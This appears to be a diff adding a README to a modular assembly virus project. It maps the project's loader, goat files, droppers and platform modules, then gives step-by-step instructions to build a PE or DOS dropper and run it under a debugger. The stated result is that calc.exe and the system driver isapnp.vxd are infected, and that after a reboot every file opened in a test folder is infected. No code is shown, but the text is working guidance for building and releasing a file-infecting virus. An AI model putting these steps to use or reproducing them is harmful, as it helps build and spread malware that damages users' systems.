@@ -1,0 +1,32 @@
+this should be in directory E:\0ASM\PROJECT
+
+and this is meaning of subdirectories:
+  bat
+    bats for compiling modules
+  bin
+    some special binaries (creating module, mounting, ...)
+  includes
+    global includes
+  loader
+    kernel (manipulating modules) with goats and starters
+  modules\compiled
+    code of all compiled modules
+  modules\compiled\modules.bat
+    bat mounting modules to loader (kernel)
+  modules\targets
+    processed target
+  modules\support
+    supporting modules - survive under various platforms (PE, VxD, DPMI)
+  modules\other
+    libs
+
+if you want to test this follow these steps:
+  1) in windows\system backup isapnp.vxd to isapnp.org (this is our primary target)  
+  2) run !.bat in all subdirectories in modules - i hope no error will occur
+  3) go to loader and run pe.bat (if you want pe dropper) or dos4.bat
+  4) run starter.exe (under SoftIce\W environment because there may be some
+     breakpoints in code I forgot ; or remove breakpoints in sources ...)
+  5) enjoy - calc.exe in loader will be infected and isapnp.vxd too. Just reboot
+     and all opened files in C:\1 will be infected.
+
+that's all
